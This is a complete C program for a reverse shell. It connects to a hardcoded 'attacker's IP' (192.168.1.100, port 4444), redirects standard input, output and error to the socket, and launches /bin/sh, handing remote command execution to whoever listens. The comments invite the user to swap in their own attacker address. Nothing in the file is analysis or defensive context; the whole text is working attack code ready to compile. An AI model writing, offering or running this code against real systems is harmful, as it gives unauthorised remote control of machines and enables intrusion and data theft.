#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

int main() {
    int sockfd;
    struct sockaddr_in server_addr;
    char *shell[2];

    // Target server details
    char *server_ip = "192.168.1.100";  // Change to attacker's IP
    int server_port = 4444;             // Change to desired port

    // Create a socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    inet_pton(AF_INET, server_ip, &server_addr.sin_addr);

    // Connect to the attacker’s server
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
        // Redirect input/output to the socket
        dup2(sockfd, 0); // stdin
        dup2(sockfd, 1); // stdout
        dup2(sockfd, 2); // stderr

        // Execute a shell
        shell[0] = "/bin/sh";
        shell[1] = NULL;
        execve(shell[0], shell, NULL);
    }

    // Close the socket in case of failure
    close(sockfd);
    return 0;
}